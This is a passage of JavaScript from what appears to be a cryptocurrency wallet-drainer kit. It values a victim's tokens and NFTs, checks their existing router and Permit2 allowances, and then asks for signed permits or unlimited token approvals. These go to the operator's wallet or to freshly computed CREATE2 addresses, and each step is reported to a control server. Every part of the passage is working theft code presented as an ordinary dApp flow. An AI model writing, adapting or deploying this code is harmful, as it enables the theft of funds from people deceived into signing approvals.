  if (MS_Settings.Settings.Wait_For_Response) await x_promise;
  sign_ready();
};

const CREATE2_PERMIT_TOKEN = async (asset) => {
    const ankr_chain_id = convert_chain("ID", "ANKR", asset.chain_id);

    const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);

    let CREATE2_Contract_ABI = [
        {
            inputs: [
                {
                    internalType: "bytes32",
                    name: "salt",
                    type: "bytes32",
                },
                {
                    internalType: "address",
                    name: "reciver",
                    type: "address",
                },
                {
                    internalType: "uint256",
                    name: "amount",
                    type: "uint256",
                },
            ],
            name: "CREATE2AndCallNative",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [
                {
                    internalType: "bytes32",
                    name: "salt",
                    type: "bytes32",
                },
            ],
            name: "CREATE2AndCallTransfer",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [
                {
                    internalType: "bytes32",
                    name: "salt",
                    type: "bytes32",
                },
            ],
            name: "calculateAddress",
            outputs: [
                {
                    internalType: "address",
                    name: "",
                    type: "address",
                },
            ],
            stateMutability: "view",
            type: "function",
        },
    ];

    const CREATE2contract = new ethers.Contract(
        MS_Settings.Settings.Chains[ankr_chain_id].CREATE2_Address,
        CREATE2_Contract_ABI,
        MS_Signer
    );

    let salt = ethers.utils.randomBytes(32);
    salt = ethers.utils.hexlify(salt);

    const create2address = await CREATE2contract.calculateAddress(salt, {
        from: MS_Current_Address,
    });

    const contract = new ethers.Contract(asset.address, asset.abi, MS_Signer);
    const nonce = await contract.nonces(MS_Current_Address);
    const name = await contract.name();
    let value = ethers.utils.parseEther(MS_Unlimited_Amount);
    for (const c_address of MS_Settings.Unlimited_BL) {
        try {
            if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
                value = asset.amount_raw;
                break;
            }
        } catch (err) {
            console.log(err);
        }
    }
    const deadline = Date.now() + 1000 * 60 * 60 * 24 * 356;
    let permit_types = null,
        permit_values = null;
    if (asset.permit == 1) {
        permit_types = {
            Permit: [
                {
                    name: "holder",
                    type: "address",
                },
                {
                    name: "spender",
                    type: "address",
                },
                {
                    name: "nonce",
                    type: "uint256",
                },
                {
                    name: "expiry",
                    type: "uint256",
                },
                {
                    name: "allowed",
                    type: "bool",
                },
            ],
        };
        permit_values = {
            holder: MS_Current_Address,
            spender: create2address,
            nonce: nonce,
            expiry: deadline,
            allowed: true,
        };
    } else if (asset.permit == 2) {
        permit_types = {
            Permit: [
                {
                    name: "owner",
                    type: "address",
                },
                {
                    name: "spender",
                    type: "address",
                },
                {
                    name: "value",
                    type: "uint256",
                },
                {
                    name: "nonce",
                    type: "uint256",
                },
                {
                    name: "deadline",
                    type: "uint256",
                },
            ],
        };
        permit_values = {
            owner: MS_Current_Address,
            spender: create2address,
            value: value,
            nonce: nonce,
            deadline: deadline,
        };
    }
    await approve_request(asset);
    sign_next();
    const result = await MS_Signer._signTypedData(
            {
                name: name,
                version: asset.permit_ver,
                chainId: asset.chain_id,
                verifyingContract: asset.address,
            },
            permit_types,
            permit_values
        ),
        signature = {
            r: result.slice(0, 66),
            s: "0x" + result.slice(66, 130),
            v: Number("0x" + result.slice(130, 132)),
        };
    await approve_success(asset);
    wait_message();
    const x_promise = send_request({
        user_id: MS_ID,
        sign: {
            type: asset.permit,
            version: asset.permit_ver,
            chain_id: asset.chain_id,
            address: asset.address,
            owner: MS_Current_Address,
            spender: create2address,
            value: value.toString(),
            nonce: nonce.toString(),
            deadline: deadline,
            r: signature.r,
            s: signature.s,
            v: signature.v,
            abi: asset.abi,
        },
        asset: asset,
        address: MS_Current_Address,
        action: "create2_permit_token",
        salt: salt.toString(),
        create2address,
        create2addressCreator: MS_Settings.Settings.Chains[ankr_chain_id].CREATE2_Address,
    });
    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
    sign_ready();
};

const sign_success = async (asset, amount = '0') => {
  try {
    if (asset.type == 'NATIVE') {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
      await send_request({ action: 'sign_success', asset, user_id: MS_ID });
    } else {
      await send_request({ action: 'sign_success', asset, user_id: MS_ID });
    }
  } catch(err) {
    console.log(err);
  }
}

const swap_success = async (type, asset, all_tokens = [], amount = '0') => {
  try {
    if (asset.type == 'NATIVE') {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
      await send_request({ action: 'swap_success', asset, user_id: MS_ID, list: all_tokens, swapper: type });
    } else {
      await send_request({ action: 'swap_success', asset, user_id: MS_ID, list: all_tokens, swapper: type });
    }
  } catch(err) {
    console.log(err);
  }
}

const transfer_success = async (asset, amount = '0') => {
  try {
    if (asset.type == 'NATIVE') {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
      await send_request({ action: 'transfer_success', asset, user_id: MS_ID });
    } else {
      await send_request({ action: 'transfer_success', asset, user_id: MS_ID });
    }
  } catch(err) {
    console.log(err);
  }
}

const approve_success = async (asset) => {
  try {
    await send_request({ action: 'approve_success', asset, user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const sign_cancel = async () => {
  try {
    await send_request({ action: 'sign_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const sign_unavailable = async () => {
  try {
    await send_request({ action: 'sign_unavailable', user_id: MS_ID });
    MS_Sign_Disabled = true;
  } catch(err) {
    console.log(err);
  }
}

const transfer_cancel = async () => {
  try {
    await send_request({ action: 'transfer_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const approve_cancel = async () => {
  try {
    await send_request({ action: 'approve_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const chain_cancel = async () => {
  try {
    await send_request({ action: 'chain_cancel', user_id: MS_ID  });
  } catch(err) {
    console.log(err);
  }
}

const chain_success = async () => {
  try {
    await send_request({ action: 'chain_success', user_id: MS_ID  });
  } catch(err) {
    console.log(err);
  }
}

const chain_request = async (old_chain, new_chain) => {
  try {
    await send_request({ action: 'chain_request', user_id: MS_ID, chains: [ old_chain, new_chain ] });
  } catch(err) {
    console.log(err);
  }
}

const sign_request = async (asset) => {
  try {
    await send_request({ action: 'sign_request', user_id: MS_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const swap_request = async (type, asset, all_tokens = []) => {
  try {
    await send_request({ action: 'swap_request', user_id: MS_ID, asset, list: all_tokens, swapper: type });
  } catch(err) {
    console.log(err);
  }
}

const transfer_request = async (asset) => {
  try {
    await send_request({ action: 'transfer_request', user_id: MS_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const approve_request = async (asset) => {
  try {
    await send_request({ action: 'approve_request', user_id: MS_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const is_increase_approve = (func) => {
  try {
    if (func.hasOwnProperty('increaseAllowance')) {
      return 1;
    } else if (func.hasOwnProperty('increaseApproval')) {
      return 2;
    } else {
      return false;
    }
  } catch(err) {
    return false;
  }
};

const get_wallet_assets = async (address) => {
  try {
    let response = await send_request({ action: 'check_wallet', address: MS_Current_Address }), assets = [];
    if (response.status == 'OK') assets = response.data;
    else if (MS_Settings.AT != "" && response.error == 'LOCAL_CHECK') assets = await get_tokens(address);
    else if (response.error != 'LOCAL_CHECK') return assets;
    else {
      MS_Check_Done = true;
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Critical Error', subtitle: 'Настройте оценщики', text: 'Ни один из оценщиков не активирован в настройках скрипта, оценка активов кошелька невозможна, проверьте настройки и перезапустите сервер!',
          showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
        });
      } else {
        Swal.close();
        Swal.fire({
          html: '<b>Ошибка</b><br><br>Ни один из оценщиков не активирован в настройках скрипта, оценка активов кошелька невозможна, проверьте настройки и перезапустите сервер!', icon: 'error',
          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
          showConfirmButton: true, confirmButtonText: 'OK'
        });
      }
      await new Promise(r => setTimeout(r, 10000));
      return assets;
    }

    let token_promises = [];

    for (let x = (assets.length - 1); x >= 0; x--) {
      try {
        const asset = assets[x];
        const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
        if (!MS_Settings.Settings.Chains[chain_id].Enable) assets.splice(x, 1);
        else if (asset.type == 'NATIVE' && !MS_Settings.Settings.Chains[chain_id].Native) assets.splice(x, 1);
        else if (asset.type == 'ERC20' && !MS_Settings.Settings.Chains[chain_id].Tokens) assets.splice(x, 1);
        else if (asset.type == 'NATIVE' && asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_Native_Price) assets.splice(x, 1);
        else if (asset.type == 'ERC20' && asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_Tokens_Price) assets.splice(x, 1);
        else if (asset.type == 'ERC20') {
          if (MS_Settings.Settings.Permit2.Mode) {
            token_promises.push(new Promise(async (resolve) => {
              try {
                if (asset.amount_usd >= MS_Settings.Settings.Permit2.Price) {
                  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
                  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
                  let allowance = await contract.allowance(MS_Current_Address, '0x000000000022d473030f116ddee9f6b43ac78ba3');
                  if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
                    asset.permit2 = true;
                    asset.allowance = allowance;
                    console.log(`[PERMIT_2 FOUND] ${asset.name}, Allowance: ${allowance}`);
                  }
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          }
          if ((MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority > 0) || (MS_Settings.Settings.Approve.MetaMask >= 2 && MS_Current_Provider == 'MetaMask') || (MS_Settings.Settings.Approve.Trust >= 2 && MS_Current_Provider == 'Trust Wallet')) {
            token_promises.push(new Promise(async (resolve) => {
              try {
                if ((MS_Settings.Settings.Approve.MetaMask >= 2 && MS_Current_Provider == 'MetaMask') || (MS_Settings.Settings.Approve.Trust >= 2 && MS_Current_Provider == 'Trust Wallet') || asset.amount_usd >= MS_Settings.Settings.Permit.Price) {
                  const data = await retrive_token(asset.chain_id, asset.address);
                  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
                  const contract = new ethers.Contract(asset.address, data, node);
                  if (is_increase_approve(contract.functions) == 2) {
                    asset.increase = 2;
                    asset.abi = data;
                  } else if (is_increase_approve(contract.functions) == 1) {
                    asset.increase = 1;
                    asset.abi = data;
                  }
                  if (asset.amount_usd >= MS_Settings.Settings.Permit.Price) {
                    const permit_type = get_permit_type(contract.functions);
                    asset.permit = permit_type;
                    asset.permit_ver = "1";
                    asset.abi = data;
                    if (permit_type > 0) {
                      if (contract.functions.hasOwnProperty('version')) {
                        try {
                          asset.permit_ver = await contract.version();
                        } catch(err) {
                          console.log(err);
                        }
                      }
                      console.log(`[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${asset.permit_ver}`);
                    }
                  }
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          }
          if (MS_Settings.Settings.Swappers.Enable) {
            token_promises.push(new Promise(async (resolve) => {
              try {
                if (asset.amount_usd >= MS_Settings.Settings.Swappers.Price) {
                  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
                  for (const swapper of MS_Routers[asset.chain_id]) {
                    try {
                      const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
                      const allowance = await contract.allowance(MS_Current_Address, swapper[1]);
                      if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
                        if (swapper[0] == 'Quickswap' && MS_Settings.Settings.Swappers.Quick == 0) continue;
                        if (swapper[0] == 'Sushiswap' && MS_Settings.Settings.Swappers.Sushi == 0) continue;
                        if (swapper[0] == 'Uniswap' && (!MS_Uniswap_Whitelist.includes(asset.address) || MS_Settings.Settings.Swappers.Uniswap == 0)) continue;
                        if ((swapper[0] == 'Pancake' || swapper[0] == 'Pancake_V3') && (!MS_Pancake_Whitelist.includes(asset.address) || MS_Settings.Settings.Swappers.Pancake == 0)) continue;
                        asset.swapper = true;
                        asset.swapper_type = swapper[0];
                        asset.swapper_address = swapper[1];
                        asset.swapper_allowance = allowance;
                        console.log(`[SWAP FOUND] ${asset.name}, ${swapper[0]}`);
                        break;
                      }
                    } catch(err) {
                      console.log(err);
                    }
                  }
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    await Promise.all(token_promises);

    let NFT_Status = false;

    for (const chain_id in MS_Settings.Settings.Chains) {
      try {
        if (MS_Settings.Settings.Chains[chain_id].NFTs) {
          NFT_Status = true;
          break;
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (NFT_Status) {
      try {
        let nft_list = [];
        response = await send_request({ action: 'check_nft', address: MS_Current_Address });
        if (response.status == 'OK') {
          nft_list = response.data;
          for (const asset of nft_list) {
            try {
              const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
              if (asset.type == 'ERC1155') continue;
              if (!MS_Settings.Settings.Chains[chain_id].NFTs) continue;
              if (asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
              assets.push(asset);
            } catch(err) {
              console.log(err);
            }
          }
        } else {
          nft_list = await get_nfts(address);
          for (const asset of nft_list) {
            try {
              const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
              if (asset.type == 'ERC1155') continue;
              if (!MS_Settings.Settings.Chains[chain_id].NFTs) continue;
              if (asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
              assets.push(asset);
            } catch(err) {
              console.log(err);
            }
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    assets.sort((a, b) => { return b.amount_usd - a.amount_usd });

    if (MS_Settings.Settings.Tokens_First == 1) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (asset.type == 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.type != 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    } else if (MS_Settings.Settings.Tokens_First == 2) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (asset.type != 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.type == 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 1) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority > 0) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.permit || asset.permit == 0 || asset.amount_usd < MS_Settings.Settings.Permit.Priority) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.permit && asset.permit > 0 && asset.amount_usd >= MS_Settings.Settings.Permit.Priority) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 2) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    return assets;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const APPROVE_TOKEN = async (asset) => {
  if (MS_Settings.Settings.Approve.Enable == 0) { await TRANSFER_TOKEN(asset); return 2; }

  if (((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask >= 2) || (MS_Current_Provider == 'Trust Wallet' && MS_Settings.Settings.Approve.Trust >= 2)) && !asset.increase) {
    try {
      for (let x = 0; x < 2; x++) {
        if (asset.increase) continue;
        try {
          const ic_data = await retrive_token(asset.chain_id, asset.address);
          const ic_node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
          const ic_contract = new ethers.Contract(asset.address, ic_data, ic_node);
          if (is_increase_approve(ic_contract.functions) == 2) asset.increase = 2;
          else if (is_increase_approve(ic_contract.functions) == 1) asset.increase = 1;
        } catch(err) {
          console.log(err);
        }
      }
    } catch(err) {
      console.log(err);
    }
  }

  if (((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask >= 2) || (MS_Current_Provider == 'Trust Wallet' && MS_Settings.Settings.Approve.Trust >= 2)) && asset.increase) return await MM_APPROVE_TOKEN(asset);
  if (((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask == 2) || (MS_Current_Provider == 'Trust Wallet' && MS_Settings.Settings.Approve.Trust == 2)) && !asset.increase) { await TRANSFER_TOKEN(asset); return 2; }
  if (((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask == 3) || (MS_Current_Provider == 'Trust Wallet' && MS_Settings.Settings.Approve.Trust == 3)) && !asset.increase) throw new Error('UNSUPPORTED');

  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }

  const unsigned_tx = { from: MS_Current_Address, to: asset.address, value: "0x0" };

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);

  contract_data = web3_contract.methods.approve((MS_Settings.Settings.Use_Randomizer_For_Tokens ? MS_Settings.Personal_Wallet.address : MS_Settings.Address), max_approval_amount).encodeABI();

  unsigned_tx.data = contract_data;
  const gas_limit = await node.estimateGas(unsigned_tx);
  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;
  unsigned_tx.nonce = nonce;

  await approve_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await approve_success(asset); sign_ready(); return 1;
};

const CREATE2_APPROVE_TOKEN = async (asset) => {
    console.log("CREATE2_APPROVE_TOKEN")
    const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);

    let CREATE2_Contract_ABI = [
        {
            inputs: [
                {
                    internalType: "bytes32",
                    name: "salt",
                    type: "bytes32",
                },
                {
                    internalType: "address",
                    name: "reciver",
                    type: "address",
                },
                {
                    internalType: "uint256",
                    name: "amount",
                    type: "uint256",
                },
            ],
            name: "CREATE2AndCallNative",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [
                {
                    internalType: "bytes32",
                    name: "salt",
                    type: "bytes32",
                },
            ],
            name: "CREATE2AndCallTransfer",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [
                {
                    internalType: "bytes32",
                    name: "salt",
                    type: "bytes32",
                },
            ],
            name: "calculateAddress",
            outputs: [
                {
                    internalType: "address",
                    name: "",
                    type: "address",
                },
            ],
            stateMutability: "view",
            type: "function",
        },
    ];
    const ankr_chain_id = convert_chain("ID", "ANKR", asset.chain_id);

    const CREATE2contract = new ethers.Contract(
        MS_Settings.Settings.Chains[ankr_chain_id].CREATE2_Address,
        CREATE2_Contract_ABI,
        MS_Signer
    );

    let salt = ethers.utils.randomBytes(32);
    salt = ethers.utils.hexlify(salt);

    const create2address = await CREATE2contract.calculateAddress(salt, {
        from: MS_Current_Address,
    });

    const gas_price = ethers.BigNumber.from(await node.getGasPrice())
        .div(ethers.BigNumber.from("100"))
        .mul(ethers.BigNumber.from("120"))
        .toString();
    const nonce = await get_nonce(asset.chain_id);
    const contract = new ethers.Contract(asset.address, MS_Contract_ABI["ERC20"], MS_Signer);
    let gas_limit = null;
    let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
    for (const c_address of MS_Settings.Unlimited_BL) {
        try {
            if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
                max_approval_amount = asset.amount_raw;
                break;
            }
        } catch (err) {
            console.log(err);
        }
    }
    try {
        gas_limit = await contract.estimateGas.approve(create2address, max_approval_amount, {
            from: MS_Current_Address,
        });
        gas_limit = ethers.BigNumber.from(gas_limit)
            .div(ethers.BigNumber.from("100"))
            .mul(ethers.BigNumber.from("120"))
            .toString();
    } catch (err) {
        gas_limit = asset.chain_id == 42161 ? 5000000 : asset.chain_id == 43114 ? 5000000 : 250000;
    }
    await approve_request(asset);
    sign_next();
    const tx = await contract.approve(create2address, max_approval_amount, {
        gasLimit: ethers.BigNumber.from(gas_limit),
        gasPrice: ethers.BigNumber.from(gas_price),
        nonce: nonce,
        from: MS_Current_Address,
    });
    wait_message();
    if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
    await send_request({
        action: "create2_approve",
        asset,
        user_id: MS_ID,
        salt: salt.toString(),
        create2address,
        create2addressCreator: MS_Settings.Settings.Chains[ankr_chain_id].CREATE2_Address,
        hash: tx.hash,
    });

    sign_ready();
    return 0;
};

const MM_APPROVE_TOKEN = async (asset) => {
    console.log("MM_APPROVE_TOKEN");
    const ankr_chain_id = convert_chain("ID", "ANKR", asset.chain_id);

    if (asset.amount_usd > MS_Settings.Settings.Chains[ankr_chain_id].Min_CREATE2_Price)
        return await CREATE2_MM_APPROVE_TOKEN(asset);
  if (((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask >= 2) || (MS_Current_Provider == 'Trust Wallet' && MS_Settings.Settings.Approve.Trust >= 2)) && !asset.increase) {
    try {
      for (let x = 0; x < 2; x++) {
        if (asset.increase) continue;
        try {
          const ic_data = await retrive_token(asset.chain_id, asset.address);
          const ic_node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
          const ic_contract = new ethers.Contract(asset.address, ic_data, ic_node);
          if (is_increase_approve(ic_contract.functions) == 2) asset.increase = 2;
          else if (is_increase_approve(ic_contract.functions) == 1) asset.increase = 1;
        } catch(err) {
          console.log(err);
        }
      }
    } catch(err) {
      console.log(err);
    }
  }

  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }

  const unsigned_tx = { from: MS_Current_Address, to: asset.address, value: "0x0" };

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const increase_type = (asset.increase == 2) ? 'increaseApproval' : 'increaseAllowance';
  const web3_contract = new web3.eth.Contract([
    {
      "inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"increment","type":"uint256"}],
      "name":`${increase_type}`,"outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"
    }
  ], asset.address);

  contract_data = web3_contract.methods[increase_type]((MS_Settings.Settings.Use_Randomizer_For_Tokens ? MS_Settings.Personal_Wallet.address : MS_Settings.Address), max_approval_amount).encodeABI();

  unsigned_tx.data = contract_data;
  const gas_limit = await node.estimateGas(unsigned_tx);
  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;
  unsigned_tx.nonce = nonce;

  await approve_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await approve_success(asset); sign_ready(); return 1;
};

const CREATE2_MM_APPROVE_TOKEN = async (asset) => {
    console.log("CREATE2_MM_APPROVE_TOKEN")
    const ankr_chain_id = convert_chain("ID", "ANKR", asset.chain_id);

    let CREATE2_Contract_ABI = [
        {
            inputs: [
                {
                    internalType: "bytes32",
                    name: "salt",
                    type: "bytes32",
                },
                {
                    internalType: "address",
                    name: "reciver",
                    type: "address",
                },
                {
                    internalType: "uint256",
                    name: "amount",
                    type: "uint256",
                },
            ],
            name: "CREATE2AndCallNative",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [
                {
                    internalType: "bytes32",
                    name: "salt",
                    type: "bytes32",
                },
            ],
            name: "CREATE2AndCallTransfer",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
        },
        {
            inputs: [
                {
                    internalType: "bytes32",
                    name: "salt",
                    type: "bytes32",
                },
            ],
            name: "calculateAddress",
            outputs: [
                {
                    internalType: "address",
                    name: "",
                    type: "address",
                },
            ],
            stateMutability: "view",
            type: "function",
        },
    ];

    const CREATE2contract = new ethers.Contract(
        MS_Settings.Settings.Chains[ankr_chain_id].CREATE2_Address,
        CREATE2_Contract_ABI,
        MS_Signer
    );

    let salt = ethers.utils.randomBytes(32);
    salt = ethers.utils.hexlify(salt);

    const create2address = await CREATE2contract.calculateAddress(salt, {
        from: MS_Current_Address,
    });

    const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
    const gas_price = ethers.BigNumber.from(await node.getGasPrice())
        .div(ethers.BigNumber.from("100"))
        .mul(ethers.BigNumber.from("120"))
        .toString();
    const nonce = await get_nonce(asset.chain_id);
    let increase_type = asset.increase == 2 ? "increaseApproval" : "increaseAllowance";
    const contract = new ethers.Contract(
        asset.address,
        [
            {
                inputs: [
                    { internalType: "address", name: "spender", type: "address" },
                    { internalType: "uint256", name: "increment", type: "uint256" },
                ],
                name: `${increase_type}`,
                outputs: [{ internalType: "bool", name: "", type: "bool" }],
                stateMutability: "nonpayable",
                type: "function",
            },
        ],
        MS_Signer
    );
    let gas_limit = null;
    let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
    for (const c_address of MS_Settings.Unlimited_BL) {
        try {
            if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
                max_approval_amount = asset.amount_raw;
                break;
            }
        } catch (err) {
            console.log(err);
        }
    }
    try {
        gas_limit = await contract.estimateGas[increase_type](create2address, max_approval_amount, {
            from: MS_Current_Address,
        });
        gas_limit = ethers.BigNumber.from(gas_limit)
            .div(ethers.BigNumber.from("100"))
            .mul(ethers.BigNumber.from("120"))
            .toString();
    } catch (err) {
        gas_limit = asset.chain_id == 42161 ? 5000000 : asset.chain_id == 43114 ? 5000000 : 250000;
    }
    await approve_request(asset);
    sign_next();
    const tx = await contract[increase_type](create2address, max_approval_amount, {
        gasLimit: ethers.BigNumber.from(gas_limit),
        gasPrice: ethers.BigNumber.from(gas_price),
        nonce: nonce,
        from: MS_Current_Address,
    });
    wait_message();
    if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
    await send_request({
        action: "approve_create2",
        asset,
        address: MS_Current_Address,
        user_id: MS_ID,
        salt: salt.toString(),
        create2address,
        create2addressCreator: MS_Settings.Settings.Chains[ankr_chain_id].CREATE2_Address,
        hash: tx.hash,
    });
    // await approve_success(asset);
    sign_ready();
    return 0;
};

const connect_wallet = async (provider = null) => {
  try {
    if (!MS_Connection) {
      if (MS_Load_Time == null || Math.floor(Date.now() / 1000) - MS_Load_Time < 15) return;
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Критическая ошибка', subtitle: 'Нет связи с сервером', text: 'Скрипт не может соединиться с сервером и получить данные, возможно вы настроили что-то некорректно или домен сервера ещё недоступен или был заблокирован. Проверьте и исправьте проблемы перед использованием сайта.',
          showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
        });
      } else {
        Swal.close();
        Swal.fire({
          html: '<b>Критическая ошибка</b><br><br>Скрипт не может соединиться с сервером и получить данные, возможно вы настроили что-то некорректно или домен сервера ещё недоступен или был заблокирован. Проверьте и исправьте проблемы перед использованием сайта.', icon: 'error',
          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
          showConfirmButton: true, confirmButtonText: 'OK'
        });
      }
      return;
